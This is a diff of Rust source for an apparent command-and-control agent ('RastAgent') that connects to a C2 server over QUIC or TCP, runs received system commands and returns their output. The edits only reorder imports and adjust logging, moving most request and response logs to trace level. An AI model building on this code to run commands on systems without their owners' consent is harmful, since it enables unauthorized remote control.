@@ -3,17 +3,18 @@
 use std::sync::{Arc, RwLock};
 
 use anyhow::{bail, Result};
-use commands::Commands;
 use futures_util::{sink::SinkExt, stream::StreamExt};
+use tokio::{process::Command as SystemCommand, sync::Mutex};
+use tracing::{debug, info, trace};
+
+use commands::Commands;
 use rast::{
     encoding::{JsonPackager, Packager},
     messages::c2_agent::{AgentMessage, AgentResponse, C2Request},
-    protocols::{quic::QuicFactory, tcp::TcpFactory, Messager, ProtoConnection, ProtoFactory},
-    settings::{Connection, Settings},
+    protocols::{Messager, ProtoConnection, ProtoFactory, quic::QuicFactory, tcp::TcpFactory},
     RastError,
+    settings::{Connection, Settings},
 };
-use tokio::{process::Command as SystemCommand, sync::Mutex};
-use tracing::{debug, info};
 
 use crate::{
     commands::{Command, CommandOutput},
@@ -52,7 +53,10 @@ impl RastAgent {
             };
 
             match conn {
-                Ok(conn) => return Ok(conn),
+                Ok(conn) => {
+                    info!("Connected to C2 at: {:?}", conn.lock().await.remote_addr()?);
+                    return Ok(conn);
+                },
                 Err(e) => bail!(e),
             };
         }
@@ -79,7 +83,7 @@ impl RastAgent {
                 };
                 let msg: AgentMessage = match packager.decode(&bytes.into()) {
                     Ok(msg) => {
-                        info!("Request {:?}", msg);
+                        trace!("Request {:?}", msg);
                         msg
                     },
                     Err(e) => {
@@ -93,12 +97,12 @@ impl RastAgent {
                 let response = response.unwrap_or(AgentMessage::AgentResponse(
                     AgentResponse::Error("Err".to_string()),
                 ));
-                debug!("Response: {response:?}");
+                trace!("Response: {response:?}");
 
                 let response = match packager.encode(&response) {
                     Ok(serialized) => serialized,
                     Err(e) => {
-                        info!(
+                        debug!(
                             "Failed to serialize response, not sending response: {:?}",
                             e
                         );
@@ -145,7 +149,7 @@ impl RastAgent {
                     .output()
                     .await;
 
-                info!("Response {:?}", output);
+                trace!("Response {:?}", output);
                 let response = match output {
                     Ok(output) => String::from_utf8_lossy(&output.stdout).into(),
                     Err(e) => e.to_string(),
